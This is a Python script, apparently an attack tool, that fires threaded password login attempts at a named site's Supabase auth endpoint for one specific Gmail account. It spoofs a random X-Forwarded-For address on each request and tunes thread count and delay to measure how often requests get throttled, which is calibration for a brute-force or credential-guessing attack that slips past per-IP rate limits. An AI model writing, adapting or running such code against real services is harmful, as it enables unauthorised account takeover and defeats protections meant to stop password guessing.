import ssl, json, urllib.request, urllib.error, time, threading, random

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
URL = "https://onlyfakeai.ru/api/supabase/auth/v1/token?grant_type=password"

def req(password, xff):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY,
         "Content-Type": "application/json", "X-Forwarded-For": xff}
    body = json.dumps({"email": "rat4080sup8q7bdw@gmail.com", "password": password}).encode()
    r = urllib.request.Request(URL, data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

def run(threads, delay, n=120):
    counts = {"400": 0, "429": 0, "403": 0, "0": 0}
    lock = threading.Lock()
    idx = [0]

    def worker():
        while True:
            with lock:
                if idx[0] >= n:
                    break
                idx[0] += 1
            xff = f"203.0.113.{random.randint(1,250)}"
            st = req(f"calib{idx[0]}!", xff)
            with lock:
                counts[str(st)] = counts.get(str(st), 0) + 1
            time.sleep(delay)

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    t0 = time.time()
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    dt = time.time() - t0
    print(f"threads={threads} delay={delay}s: {counts} in {dt:.1f}s "
          f"({n/dt:.1f} attempts/s, {100*counts.get('429',0)/n:.0f}% throttle)")

run(2, 0.2)
time.sleep(3)
run(3, 0.2)
time.sleep(3)
run(2, 0.1)
